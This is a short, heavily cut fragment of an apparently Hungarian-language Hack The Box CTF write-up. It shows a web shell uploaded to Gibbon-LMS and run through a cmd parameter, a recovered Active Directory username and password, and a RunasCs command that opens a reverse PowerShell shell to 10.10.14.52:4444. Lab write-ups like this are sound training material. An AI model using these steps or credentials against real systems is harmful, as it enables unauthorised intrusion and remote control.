# HTB The Fizz - Writeup (magyar, bővített)
...
```
- Feltölti a shellt
- Megnyitja: http://10.10.11.60:80/Gibbon-LMS/gibbon_myconfig.php?cmd=whoami
...
- Belső jelszó: kinyerve, benne **újabb AD user: M.SchoolBus / !suBcig@MehTed!R**
...
```powershell
.\RunasCs.exe 'M.schoolbus' '!suBcig@MehTed!R' powershell.exe -r 10.10.14.52:4444
```
...
1. Töltsd le a forrást: https://github.com/antonioCoco/RunasCs
